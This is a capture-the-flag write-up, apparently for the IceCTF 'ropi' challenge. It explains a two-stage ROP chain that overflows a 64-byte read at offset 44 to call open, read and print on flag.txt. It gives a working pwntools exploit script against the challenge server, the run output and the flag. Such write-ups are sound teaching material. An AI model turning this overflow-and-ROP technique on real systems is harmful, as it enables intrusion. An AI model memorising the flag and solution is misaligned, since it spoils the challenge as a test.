### Solved by superkojiman

The name of the binary hints that we need to use ROP. There are three functions that aren't referenced anywhere:

ret(): calls open() on "flag.txt"
ori(): calls read() on the file descriptor returned by open() in ret()
pro(): prints out the flag stored in the buffer filled in by read() in ori()

So the idea then would be to ROP to ret() -> ori() -> pro(). However it's not that simple since the binary only reads in 64 bytes, and EIP is overwritten at offset 44, which doesn't leave a lot of room for chaining those calls together.

The read() that overwrites EIP occurs in ezy(). The solution I came up with was to return to ret(), then return to ezy() so I could do the read() again and overwrite EIP again. The second time, instead of returning to ret(), I returned to ori(). From ori(), I just return directly to pro() to print out the flag.

Here's the exploit:

```
#!/usr/bin/env python

from pwn import *

popret   = p32(0x8048395)
r = remote("ropi.vuln.icec.tf", 6500)

pad = ""
pad += cyclic(44)

# stage 1
buf = ""
buf += p32(0x08048569)          # ret(): calls open("flag.txt", 0)
buf += popret                   # clear off the key after we use it
buf += p32(0xbadbeeef)          # ret() expects this key
buf += p32(0x0804852d)          # return to ezy() to read() more input again

print r.recv()                  # banner
r.send(pad + buf)               # send stage 1

# stage 2
buf = ""
buf += p32(0x080485c4)          # ori(): calls read("flag.txt")
buf += p32(0x0804862c)          # return to pro() which prints out the flag
buf += p32(0xabcdefff)          # ori() expects this key

r.send(pad + buf)

# print out the flag
print r.recvall()
```

And here it is in action:

```
$ ./sploit.py
[+] Opening connection to ropi.vuln.icec.tf on port 6500: Done
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?

[+] Recieving all data: Done (150B)
[*] Closed connection to ropi.vuln.icec.tf port 6500
[+] aperto
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] leggi
[+] stampare
IceCTF{italiano_ha_portato_a_voi_da_google_tradurre}
```
